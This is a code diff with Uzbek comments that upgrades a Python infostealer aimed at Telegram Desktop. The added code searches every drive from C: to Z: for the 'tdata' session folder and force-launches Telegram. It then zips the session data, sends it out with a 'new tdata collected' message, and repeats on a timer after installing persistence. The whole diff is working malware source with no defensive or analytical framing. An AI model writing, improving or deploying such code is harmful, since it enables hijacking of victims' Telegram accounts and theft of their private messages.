@@ -36,25 +36,30 @@ def send_file(file_path, caption):
     except:
         pass
 
-def get_tdata():
+def get_tdata_bruteforce():
     pc_name = socket.gethostname()
+    # 1. Standart yo'ldan qidiramiz
     appdata = os.getenv('APPDATA')
     tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
     if os.path.exists(tdata_path):
-        try:
-            temp_dir = tempfile.gettempdir()
-            zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
-            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                for root, dirs, files in os.walk(tdata_path):
-                    for file in files:
-                        try:
-                            file_path = os.path.join(root, file)
-                            zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
-                        except: pass
-            return zip_path
-        except:
-            return None
-    return None
+        return tdata_path, pc_name
+    
+    # 2. Agar topilmasa, hamma disk va papkalarni qidiramiz (C: dan Z: gacha)
+    for drive_letter in range(ord('C'), ord('Z') + 1):
+        drive = f"{chr(drive_letter)}:\\"
+        if os.path.exists(drive):
+            try:
+                for root, dirs, files in os.walk(drive, topdown=True):
+                    if os.path.basename(root).lower() == 'tdata':
+                        # TelegramsDesktop papkasini topdik!
+                        return root, pc_name
+                    if 'telegramdesktop' in root.lower():
+                        possible_tdata = os.path.join(root, 'tdata')
+                        if os.path.exists(possible_tdata):
+                            return possible_tdata, pc_name
+            except:
+                pass
+    return None, pc_name
 
 def install_persistence():
     try:
@@ -67,25 +72,66 @@ def install_persistence():
     except:
         pass
 
-# MAIN (O'rnatish va birinchi tdata)
+def force_start_telegram():
+    try:
+        # Agar Telegram Desktop ochiq bo'lmasa, uni majburan ochamiz
+        result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
+        if "Telegram.exe" not in result.stdout:
+            subprocess.Popen(['start', 'Telegram'], shell=True)
+            time.sleep(15)  # Telegrams ochilishi uchun vaqt beramiz
+    except:
+        pass
+
+# MAIN
 install_persistence()
-zip_path = get_tdata()
-if zip_path:
-    send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {socket.gethostname()}")
-    os.remove(zip_path)
+
+# Telegram Desktop ni majburan ochamiz (agar ochiq bo'lmasa)
+force_start_telegram()
+
+# Qidiruvni boshlaymiz (eng kuchli qidiruv)
+tdata_path, pc_name = get_tdata_bruteforce()
+
+if tdata_path:
+    # Agar topilsa, darhol yig'amiz va yuboramiz
+    try:
+        temp_dir = tempfile.gettempdir()
+        zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, dirs, files in os.walk(tdata_path):
+                for file in files:
+                    try:
+                        file_path = os.path.join(root, file)
+                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
+                    except: pass
+        send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
+        os.remove(zip_path)
+    except:
+        pass
 
 # Doimiy kuzatish
 last_sent = 0
 while True:
-    time.sleep(600)
+    time.sleep(300) # Har 5 daqiqada tekshiradi
     try:
         result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
         if "Telegram.exe" in result.stdout:
-            if time.time() - last_sent > 1800:
-                zip_path = get_tdata()
-                if zip_path:
-                    send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {socket.gethostname()}")
-                    os.remove(zip_path)
-                    last_sent = time.time()
+            if time.time() - last_sent > 1800: # Har 30 daqiqada yangilash
+                tdata_path, pc_name = get_tdata_bruteforce()
+                if tdata_path:
+                    try:
+                        temp_dir = tempfile.gettempdir()
+                        zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
+                        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                            for root, dirs, files in os.walk(tdata_path):
+                                for file in files:
+                                    try:
+                                        file_path = os.path.join(root, file)
+                                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
+                                    except: pass
+                        send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
+                        os.remove(zip_path)
+                        last_sent = time.time()
+                    except:
+                        pass
     except:
         pass
